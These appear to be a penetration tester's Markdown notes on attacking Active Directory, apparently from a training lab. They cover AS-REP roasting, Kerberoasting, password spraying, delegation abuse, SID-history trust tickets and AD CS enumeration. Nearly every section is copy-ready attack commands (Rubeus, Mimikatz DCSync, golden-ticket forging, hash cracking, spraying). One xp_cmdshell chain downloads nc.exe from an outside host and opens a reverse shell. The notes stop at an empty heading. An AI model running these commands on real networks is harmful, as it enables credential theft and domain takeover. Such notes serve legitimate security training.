### AsReproasting
>__Pre-Authentication__ means sending encrypted timestamp before requesting TGT.

As-reproasting occurs when a user account has the privilege "_Does not require Pre-Authentication_" enabled. 

- Attackers can send a junk request for authentication, and the KDC will return _TGT_ for users that have Pre-Authentication disabled.
- KDC responds with the `PRINCIPAL UNKNOWN` error for invalid usernames.
- Whenever the KDC prompts for Kerberos Pre-Authentication, this means username exists.

> With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.

```bash
GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip $IP
```

```bash
kerbrute userenum --dc-ip $IP -d domain.local users.txt --downgrade
```

```bash
hashcat -m 18200 -a 0 hashes.txt passwordlist.txt -O
```

##### Windows
__AsRep not Required Users__
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
__Get AsRep Request__
```powershell
Get-ASREPHash -UserName VPN1user -Verbose
```

```powershell
 .\Rubeus.exe asreproast /user:adunn /nowrap
```
- We need to insert `23` after the `$krb5asrep$` for above.

```powershell
Invoke-ASREPRoast -Verbose
```

__Force disable Kerberos Preauth__
```powershell
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
```


---
### Kerberoasting
Domain-connected services, such as MSSQL, web servers may be connected and issued identifiers that allow Kerberos to authenticate the service account. 
- If a domain user account is compromised, then that account can request kerberoastable account names and their _TGS_
- A Kerberoastable account is one that has an SPN set.
- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).

> In order to request SPNs, a domain account is required to make the query.


```bash
GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip $IP -request
```

```bash
hashcat -m 13100 -a 0 hashes.txt passwordlist.txt -O
```

##### Windows
```powershell
Get-DomainUser -Identity supportuser | select serviceprincipalname
```
```powershell
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```
__Force set SPN__
```powershell
Set-DomainObject -Identity support1user 
-Set @{serviceprincipalname=‘dcorp/whatever1'}
```
__Append extra SPN__
```powershell
Set-ADUser -Identity support1user 
-ServicePrincipalNames @{Add=‘dcorp/whatever1'}
```

---
### Password Spraying
|Tool|Ports|
|-|-|
|nmblookup|137/UDP|
|nbtstat|137/UDP|
|net|139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535|
|rpcclient|135/TCP|
|smbclient|445/TCP|

__rpcclient__
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" $IP | grep Authority; done
```

__Kerbrute__
```shell-session
kerbrute passwordspray -d inlanefreight.local --dc $IP valid_users.txt  Welcome1
```

__CrackMapExec__
```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

__Local Admin Spraying__
- `--local-auth` flag will tell the tool only to attempt to _log in one time_ on each machine
```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

__[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)__
- Automatically generate a user list from AD, query the domain password policy, and exclude user accounts within one attempt of locking out.
```powershell
Invoke-DomainPasswordSpray -Password Spring2017
```

```powershell
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

---
### PowerUpSQL
[MS SQL Red Teaming](https://h4ms1k.github.io/Red_Team_MSSQL_Server/#)

__SQL Servers__
```powershell
Get-SQLInstanceDomain
```

__DB links__
```powershell
Get-SQLServerLink -Instance devsrv.garrison.castle.local
```

```powershell
Get-SQLServerLinkCrawl -Instance devsrv.garrison.castle.local -Verbose
```

__Download nc__
```powershell
Get-SQLServerLinkCrawl -Instance devsrv.garrison.castle.local -Query
`exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadFile('http://172.16.99.11/nc.exe','C:\Windows\Temp\nc.exe')"`
```

__Reverse Shell__
```powershell
Get-SQLServerLinkCrawl -Instance devsrv.garrison.castle.local -Query `exec master..xp_cmdshell "C:\Windows\Temp\nc.exe -e cmd 172.16.10.1 9001"`
```


---
### Kerberos Unconstrained Delegation

Discover domain computers which have unconstrained delegation enabled:
```powershell
Get-DomainComputer -UnConstrained
```

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

```powershell
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

#### Attack
- Compromise the server where Unconstrained delegation is enabled.
- We must trick or wait for a domain admin to connect a service on appsrv.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

- The DA token could be reused:
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

>__Printer Bug__
> MS-RPRN feature which _allows any domain authenticated user to force any machine , running the Spooler service, to connect to a second machine of the domain user's choice_.

__Force connect two machines:__
- We can force the dcorp-dc to connect to dcorp-appsrv by abusing the Printer bug
- We can capture the TGT of dcorp-dc$ by using Rubeus on dcorp-appsrv:
```powershell
Rubeus.exe monitor /interval:5 /nowrap
```
- And after that run [MS-RPRN.exe](https://github.com/leechristensen/SpoolSample) on the student VM:
```powershell
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local
\\dcorp-appsrv.dollarcorp.moneycorp.local
```

>From a Linux machine attack: [Coercer](https://github.com/p0dalirius/Coercer) for other MS protocols that can be abused for coercion.

- Copy the base64 encoded TGT, remove any extra spaces & use it on the student VM:
```powershell
Rubeus.exe ptt /tikcet:
```

- Once the ticket is injected, run DCSync:
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 
```
 ---
###  Kerberos Constrained Delegation
>Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified.

Enumerate users and computers with constrained delegation enabled

```powershell
Get-DomainUser -TrustedToAuth
```

```powershell
Get-DomainComputer -TrustedToAuth
```

```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} 
-Properties msDS-AllowedToDelegateTo
```

#### Attacks
__Kekeo__
- Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc's hash from dcorp-adminsrv
- Using asktgt from Kekeo, we request a TGT:
```powershell
tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local
/rc4:cc098f204c5887eaa8253e7c2749156f
```
- Using s4u from Kekeo, we request a TGS:
```powershell
tgs::s4u
/tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneyco
rp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
/user:Administrator@dollarcorp.moneycorp.local 
/service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```

__Mimikatz__
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt
TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.
MONEYCORP.LOCAL_cifs~dcorp-
mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LO
CAL.kirbi"'
```

__Rubeus__
- We are requesting a TGT and TGS in a single command:
```powershell
Rubeus.exe s4u /user:websvc
/aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e87
9470ade07e5412d7 /impersonateuser:Administrator
/msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL
/ptt
```
---
### Kerberos Resource-based Constrained Delegation
>In other words, an attack can execute code/commands as `domain admin` only on the `mgm-dcorp` machine and not on any other machine in the domain.

- This moves delegation authority to the resource/service administrator.
- Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service.
- That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins.

#### Attack
__Attack Prerequisites__
_To abuse RBCD_ in the most effective form, we just need two privileges:
1. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.
2. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - _ms-DS-MachineAccountQuota_ is 10 for all domain users)

__Attack__
- User 'ciadmin' has Write permissions over the dcorp-mgmt machine!
```powershell
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

- Using the AD module, configure RBCD on dcorp-mgmt for student machines :
```powershell
$comps = 'dcorp-student1$','dcorp-student2$'
```
- We are delegating student machine to impersonate as any user on `dcorp-mgmt`
```powershell
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```

- Now, let's get the privileges of dcorp-studentx$ by extracting its AES keys:
```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

- Use the AES key of dcorp-studentx$ with Rubeus and access dcorp-mgmt as ANY user we want:
```powershell
Rubeus.exe s4u /user:dcorp-student1$
/aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d
83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt
/impersonateuser:administrator /ptt
```
- Login with _admin TGT_
```powershell
winrs -r:dcorp-mgmt cmd.exe
```

---
### SID History Abuse
- sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
- sIDHistory can be abused in two ways of escalating privileges within a forest:
	- krbtgt hash of the child
	- Trust tickets

#### Child to Parent - Trust Key Attack

__Look for Trust Key__
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
```
or
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync/user:dcorp\mcorp$"'
```
or
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

__Forge Inter-relam TGT__
```powershell
BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```

__Get TGS__
Keko
```powershell
asktgs.exe trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
```

Rubeus
```powershell
Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

__Use the TGS to access the targeted service__
```powershell
kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
```

![[Pasted image 20240123141106.png]]

---
### AD CS (Active Directory Certificate Services)
- Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.
- AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.
- "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."
- __CA__ - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.
- __Certificate__ - Issued to a user or machine and can be used for authentication, encryption, signing etc.
- __CSR__ - Certificate Signing Request made by a client to the CA to request a certificate.
- __Certificate Template__ - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.
- __EKU OIDs__ - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.

![[Pasted image 20240128131239.png]]

__There are various ways of abusing ADCS:__
– Extract user and machine certificates
– Use certificates to retrieve NTLM hash
– User and machine level persistence
– Escalation to Domain Admin and Enterprise Admin
– Domain persistence

![[Pasted image 20240128132007.png]]
![[Pasted image 20240128132033.png]]
#### AD CS Enumeration
##### Requirements for ESC1, ESC3, ESC6
– CA grants normal/low-privileged users enrollment rights
– Manager approval is disabled
– Authorization signatures are not required
– The target template grants normal/low-privileged users enrollment rights


__Enumerate CA__
```powershell
Certify.exe cas
```
__Enumerate templates__
```powershell
Certify.exe find
```

__Enumerate vulnerable templates__
```powershell
Certify.exe find /vulnerable
```




#### EC3



